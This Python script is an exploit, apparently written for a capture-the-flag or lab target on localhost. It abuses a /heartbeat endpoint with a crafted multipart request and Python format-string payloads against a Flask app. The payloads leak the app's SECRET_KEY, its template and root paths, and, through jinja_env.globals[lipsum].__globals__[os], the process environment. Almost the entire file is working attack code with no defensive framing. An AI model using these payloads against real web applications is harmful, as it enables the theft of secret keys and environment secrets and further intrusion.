import requests
import re

TARGET = 'http://127.0.0.1:5000'

def format_string_leak(payload):
    boundary = 'BOUNDARY'
    body = (
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="content"; filename="content"\r\n'
        f'Content-Type: text/plain\r\n\r\n'
        f'{payload}\r\n'
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        '{{"type": "debug"}}\r\n'
        f'--{boundary}--\r\n'
    )
    
    url = f'{TARGET}/heartbeat?text=x&client=Content-Type&token=multipart/form-data; boundary={boundary}'
    resp = requests.post(url, data=body.encode(), headers={'Content-Type': 'application/octet-stream'})
    return resp.text

# 先获取 API_KEY
api_key = format_string_leak('{0.config[SECRET_KEY]}')
print(f"API_KEY response: {api_key}")

# 测试各种 loader 属性
payloads = [
    '{0.jinja_env.loader.searchpath}',
    '{0.jinja_env.loader.searchpath[0]}',
    '{0.jinja_env.loader}',
    '{0.jinja_env.loader.encoding}',
    '{0.template_folder}',
    '{0.root_path}',
    # 尝试访问 os 模块
    '{0.jinja_env.globals[lipsum].__globals__[os].sep}',
    '{0.jinja_env.globals[lipsum].__globals__[os].curdir}',
    '{0.jinja_env.globals[lipsum].__globals__[os].pardir}',
    '{0.jinja_env.globals[lipsum].__globals__[os].name}',
    '{0.jinja_env.globals[lipsum].__globals__[os].environ}',
]

for p in payloads:
    try:
        result = format_string_leak(p)
        print(f"{p}: {result[:200]}")
    except Exception as e:
        print(f"{p}: Error - {e}")
